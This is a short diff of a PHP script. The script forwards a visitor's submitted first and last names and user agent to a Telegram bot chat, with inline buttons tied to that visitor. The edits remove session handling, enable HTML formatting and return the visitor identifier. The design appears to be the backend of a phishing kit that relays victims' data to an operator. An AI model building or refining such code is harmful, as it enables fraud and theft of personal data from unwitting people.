@@ -1,7 +1,5 @@
 <?php
 ini_set('display_errors', 0);
-error_reporting(E_ALL);
-session_start();
 header('Content-Type: application/json; charset=UTF-8');
 
 require_once __DIR__ . '/data.php';
@@ -44,7 +42,6 @@ $msg .= "📲 <b>UA:</b> " . substr($ua, 0, 80) . "\n";
 
 // Identificador para los botones
 $uid = $nombres . ' ' . $apellidos;
-$_SESSION['usuario'] = $uid;
 
 $keyboard = json_encode([
     'inline_keyboard' => [
@@ -68,7 +65,8 @@ $keyboard = json_encode([
 file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
     'chat_id'      => $chat_id,
     'text'         => $msg,
+    'parse_mode'   => 'HTML',
     'reply_markup' => $keyboard,
 ]));
 
-echo json_encode(['ok' => true]);
+echo json_encode(['ok' => true, 'uid' => $uid]);
